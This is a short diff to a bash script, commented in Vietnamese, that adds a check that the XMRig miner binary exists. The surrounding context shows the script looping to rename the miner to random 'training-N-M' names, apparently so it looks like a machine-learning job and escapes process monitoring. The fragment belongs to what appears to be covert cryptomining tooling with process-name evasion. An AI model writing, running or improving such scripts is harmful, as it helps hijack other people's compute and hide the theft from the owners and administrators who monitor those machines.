@@ -17,6 +17,12 @@ while true; do
         sleep 5
     fi
 
+    # Kiểm tra file XMRig có tồn tại hay không trước khi đổi tên
+    if [ ! -f $WORK_DIR/xmrig-${VERSION}/xmrig ]; then
+        echo "XMRig không tồn tại tại $WORK_DIR/xmrig-${VERSION}/xmrig. Kiểm tra quá trình cài đặt."
+        exit 1
+    fi
+
     # Tạo tên mới cho XMRig và chạy lại
     echo "Tạo tên mới cho XMRig..."
     RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
